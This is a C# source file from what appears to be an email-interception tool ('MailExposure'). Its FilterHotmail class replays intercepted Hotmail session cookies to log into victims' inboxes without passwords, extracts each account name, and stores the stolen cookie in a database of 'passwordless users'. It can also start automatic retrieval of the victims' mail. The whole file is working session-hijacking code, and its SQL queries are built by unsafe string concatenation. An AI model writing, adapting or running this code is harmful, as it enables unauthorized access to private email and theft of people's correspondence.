using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Web;
using System.Net;
using System.IO;
using System.Threading;

namespace MailExposure.CookieMailRC
{
    class FilterHotmail:DisplaceNew
    {
        // Fields
        private bool Auto;
        private string cookieRemarks;
        private string strCookie;
        private string urls;
        private int userIndex;
        private string userListNames;
        private string UserName;

        // Methods
        public FilterHotmail(string url, string strCookie, string interceptTime, string userList, bool Auto, string cookieRemarks)
        {
            this.urls = "";
            this.UserName = "";
            this.strCookie = "";
            this.userListNames = "";
            this.cookieRemarks = "";
            base.url = url;
            base.cookie = strCookie;
            this.strCookie = strCookie;
            base.interceptTime = interceptTime;
            this.userListNames = userList;
            this.Auto = Auto;
            this.cookieRemarks = cookieRemarks;

        }
        public void loginUser()
        {
            base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
            base.streamControl = true;
            base.MyStringBuilder = this.Request(base.url);
            string message = base.MyStringBuilder.ToString();
            if (message.IndexOf("id=\"UIFrame\"") >= 0)
            {
                string s = base.putstr(message.ToString(), "src=\"", "\"", 0);
                if (s != "-1")
                {
                    s = HttpUtility.HtmlDecode(s);
                    if (base.Host == null)
                    {
                        string str3 = base.putstr(s, "http:", "/mail/", 0);
                        if ((str3 != "-1") && (base.Host == null))
                        {
                            base.Host = "http:" + str3;
                        }
                    }
                    if (!s.EndsWith("png"))
                    {
                        base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                        base.streamControl = true;
                        base.MyStringBuilder = this.Request(s);
                        message = base.MyStringBuilder.ToString();
                    }
                }
                if (message.IndexOf("Object moved") >= 0)
                {
                    string str = base.putstr(message.ToString(), "href=\"", "\"", 0);
                    if (str != "-1")
                    {
                        str = HttpUtility.UrlDecode(str);
                        if (base.Host == null)
                        {
                            string str5 = base.putstr(s, "http:", "/mail/", 0);
                            if ((str5 != "-1") && (base.Host == null))
                            {
                                base.Host = "http:" + str5;
                            }
                        }
                        base.url = base.Host + str;
                        base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                        base.streamControl = true;
                        base.MyStringBuilder = this.Request(base.url);
                        message = base.MyStringBuilder.ToString();
                        int index = message.IndexOf("name=\"main\"");
                        if (index >= 0)
                        {
                            string str6 = base.putstr(message, "src=\"", "\"", index);
                            if (str6 != "-1")
                            {
                                base.url = base.Host + str6;
                                base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                                base.streamControl = true;
                                base.MyStringBuilder = this.Request(base.url);
                                if (base.MyStringBuilder.ToString().IndexOf("class=\"ManageLink\"") < 0)
                                {
                                    base.url = base.Host + "SwitchClassicVersion.aspx";
                                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                                    base.streamControl = true;
                                    base.MyStringBuilder = this.Request(base.url);
                                    if (base.MyStringBuilder.ToString().IndexOf("Object moved") >= 0)
                                    {
                                        str = base.putstr(base.MyStringBuilder.ToString(), "href=\"/mail/", "\"", 0).Replace("&amp;", "&");
                                        base.url = base.Host + str;
                                        base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                                        base.streamControl = true;
                                        base.MyStringBuilder = this.Request(base.url);
                                        message = base.MyStringBuilder.ToString();
                                    }
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                int startIndex = 0;
                string indata = "";
                int num3 = message.IndexOf("class=\"ManageLink\"");
                if (num3 < 0)
                {
                    num3 = message.IndexOf("href=\"ManageFoldersLight");
                }
                if (num3 < 0)
                {
                    string str8 = "";
                    string str9 = "";
                    string str10 = "";
                    startIndex = message.IndexOf("__VIEWSTATE");
                    if (startIndex > 0)
                    {
                        str8 = base.putstr(message, "value=\"", "\"", startIndex);
                    }
                    startIndex = message.IndexOf("TakeMeToInbox");
                    if (startIndex > 0)
                    {
                        str9 = base.putstr(message, "value=\"", "\"", startIndex);
                    }
                    startIndex = message.IndexOf("__EVENTVALIDATION");
                    if (startIndex > 0)
                    {
                        str10 = base.putstr(message, "value=\"", "\"", startIndex);
                    }
                    if ((((str8 != "-1") && (str9 != "-1")) && ((str10 != "-1") && (str8 != ""))) && (((str9 != "") && (str10 != "")) && ((this.urls != null) && (this.urls != ""))))
                    {
                        indata = ("__VIEWSTATE=" + str8 + "&TakeMeToInbox=%E7%BB%A7%E7%BB%AD&__EVENTVALIDATION=" + str10).Replace("/", "%2F").Replace("+", "%2B");
                        base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                        base.streamControl = true;
                        base.MyStringBuilder = this.PostData(this.urls, indata);
                        if (base.MyStringBuilder.ToString().IndexOf("Object moved") >= 0)
                        {
                            string str11 = base.putstr(base.MyStringBuilder.ToString(), "href=\"", "\"", 0);
                            if (str11 != "-1")
                            {
                                base.url = base.Host + str11;
                                base.url = base.url.Replace("mail//mail", "mail");
                                base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                                base.streamControl = true;
                                base.MyStringBuilder = this.Request(base.url);
                            }
                        }
                        message = base.MyStringBuilder.ToString();
                        if (message.IndexOf("class=\"ManageLink\"") < 0)
                        {
                            num3 = message.IndexOf("href=\"ManageFoldersLight");
                        }
                    }
                }
            }
            this.userIndex = message.IndexOf("id=\"uxp_hdr_meLink\"");
            if (this.userIndex < 0)
            {
                this.userIndex = message.IndexOf("<div class=\"EmailName DisplayBlock\">");
                if (this.userIndex < 0)
                {
                    this.userIndex = message.IndexOf("<div class=ȮmailName DisplayBlock\">");
                }
            }
            if (this.userIndex != -1)
            {
                this.UserName = base.putstr(message, "title=\"", "@hotmail.com", this.userIndex);
                if (this.UserName == "-1")
                {
                    this.UserName = base.putstr(message, "<div class=\"EmailName DisplayBlock\">", "</div>", this.userIndex);
                    if (this.UserName != "-1")
                    {
                        this.UserName = this.UserName.Replace("&#64;", "@");
                        if (this.UserName.IndexOf("@") == -1)
                        {
                            GlobalValue.mainForm.listBoxView.Items.Add("取用户名失败！");
                            GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                        }
                    }
                }
                if (this.UserName != "-1")
                {
                    if ((this.UserName == "") || (this.UserName == null))
                    {
                        GlobalValue.mainForm.listBoxView.Items.Add("Cookie 可能已失效");
                        GlobalValue.mainForm.listBoxView.Items.Add("结束过滤");
                        GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                    }
                    else
                    {
                        if (this.urls == "")
                        {
                            this.urls = base.url;
                        }
                        string str12 = "'" + this.UserName + "'";
                        string str13 = "'" + this.strCookie + "'";
                        string str14 = "'capH'";
                        string str15 = "'H'";
                        string str16 = "'" + base.interceptTime + "'";
                        string usertype = "'无密用户'";
                        string str18 = "'是'";
                        if (this.cookieRemarks.Length > 0)
                        {
                            str14 = "'" + this.cookieRemarks + "'";
                        }
                        else
                        {
                            str14 = "'" + DateTime.Now.ToString("yyyMMdd") + "'";
                        }
                        string str19 = this.Auto ? "1" : "0";
                        str19 = "'" + str19 + "'";
                        this.userListNames = "'" + this.userListNames + "'";
                        string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收,用户列表,自动收取) values(" + str14 + "," + str12 + "," + str15 + "," + str15 + "," + str14 + ",'" + this.urls + "'," + str13 + "," + str16 + "," + usertype + "," + str18 + "," + this.userListNames + "," + str19 + ")";
                        string str21 = "select count(*)from users where 服务器地址=" + str15 + "and 用户名=" + str12 + "and 用户类型=" + usertype;
                        string str22 = "update users set 邮件地址='" + base.url + "',验证登陆=" + str13 + " where 服务器地址=" + str15 + "and 用户名=" + str12 + "and 用户类型=" + usertype;
                        if (Convert.ToInt32(GlobalValue.mainForm.ExecuteSQL(str21)) <= 0)
                        {
                            GlobalValue.mainForm.ExecuteSQL(strSql);
                            GlobalValue.mainForm.listBoxView.Items.Add("添加用户：" + this.UserName);
                            GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                            GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                            if (this.Auto)
                            {
                                new BeginReceiveThreads(1, "H", "H", this.UserName, "", str14.Trim(new char[] { '\'' }), "capH", 0, base.url, this.strCookie, usertype, this.userListNames.Trim(new char[] { '\'' })).Execute();
                            }
                        }
                        else
                        {
                            str21 = "select 时间限制 from users where 服务器地址=" + str15 + "and 用户名=" + str12 + "and 用户类型=" + usertype;
                            DateTime time = DateTime.Parse(GlobalValue.mainForm.ExecuteSQL(str21));
                            if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                            {
                                GlobalValue.mainForm.ExecuteSQL(str22);
                                GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]：修改用户！");
                                GlobalValue.mainForm.listBoxView.Items.Add("[" + this.UserName + "]: 结束过滤");
                                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
                                if (this.Auto)
                                {
                                    new BeginReceiveThreads(1, "H", "H", this.UserName, "", str14.Trim(new char[] { '\'' }), "capH", 0, base.url, this.strCookie, usertype, this.userListNames.Trim(new char[] { '\'' })).Execute();
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                GlobalValue.mainForm.listBoxView.Items.Add("Cookie 可能已失效");
                GlobalValue.mainForm.listBoxView.Items.Add("结束过滤");
                GlobalValue.mainForm.listBoxView.SelectedIndex = GlobalValue.mainForm.listBoxView.Items.Count - 1;
            }

        }
        public StringBuilder PostData(string url, string indata)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.ServicePoint.Expect100Continue = false;
                request.Method = "POST";
                request.Headers.Add("Cookie", base.cookie);
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Pragma:no-cache\r\n");
                request.Accept = "image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, application/vnd.ms-excel, application/msword, */*";
                request.Headers.Add("Accept-Language: en-us,ar-SA;q=0.9,de-DE;q=0.8,es-ES;q=0.7,tr-TR;q=0.6,ja-JP;q=0.5,en-GB;q=0.4,fr-FR;q=0.3,zh-CN;q=0.2,zh-TW;q=0.1");
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; TencentTraveler ; .NET CLR 1.1.4322)";
                request.ContentLength = indata.Length;
                request.AllowAutoRedirect = false;
                request.KeepAlive = true;
                Stream requestStream = request.GetRequestStream();
                char[] chars = Encoding.ASCII.GetChars(Encoding.ASCII.GetBytes(indata));
                StreamWriter writer = new StreamWriter(requestStream);
                writer.Write(chars, 0, chars.Length);
                writer.Close();
                requestStream.Close();
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                Thread.Sleep(10);
                response.GetResponseStream();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                string str = "";
                if (headers["Content-Type"] != null)
                {
                    str = headers["Content-Type"];
                    base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                }
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        base.MyStringBuilder = this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                }
            }
            catch (Exception exception)
            {
                base.ShowMessage("Hpost:" + exception.Message);
            }
            return base.MyStringBuilder;

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "*/*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        string str2 = base.putstr(this.urls, "http:", "/mail/", 0);
                        if ((str2 != "-1") && (base.Host == null))
                        {
                            base.Host = "http:" + str2 + "/mail/";
                        }
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str3 = reader.ReadLine(); str3 != null; str3 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str3 + "\r\n");
                        str3 = null;
                    }
                    base.streamControl = false;
                }
                reader.Close();
            }
            catch (Exception exception)
            {
                base.ShowMessage("HRequest" + exception.Message);
            }
            return base.MyStringBuilder;
        }

    }
}
